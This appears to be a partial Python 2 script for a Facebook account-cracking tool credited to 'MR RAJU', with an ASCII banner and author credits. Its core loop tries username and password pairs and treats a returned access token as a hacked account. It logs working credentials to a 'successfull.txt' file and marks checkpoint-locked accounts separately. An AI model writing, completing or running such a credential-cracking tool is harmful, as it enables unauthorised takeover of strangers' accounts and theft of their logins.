#Tools Created By MR RAJU
#MR RAJU Technology Channel
...
\033[0;94m    _____ _ _    _ |  __ \     /\       | | |  | |
\033[0;94m | |__) |   /  \      | | |  | |
\033[0;96m |  _  /   / /\ \ _   | | |
\033[0;96m   | | \ \  / ____ \ |__| | |__| |
\033[0;96m  |_|  \_\/_/    \_\____/ \____/
""")

print("\033[0;91mThis Tool's Free By MR RAJU")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : BREAND RAJU'
    print '\033[0;94mFACEBOOK : ALONE RAJIU'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MR RAJU-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[MR RAJU-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
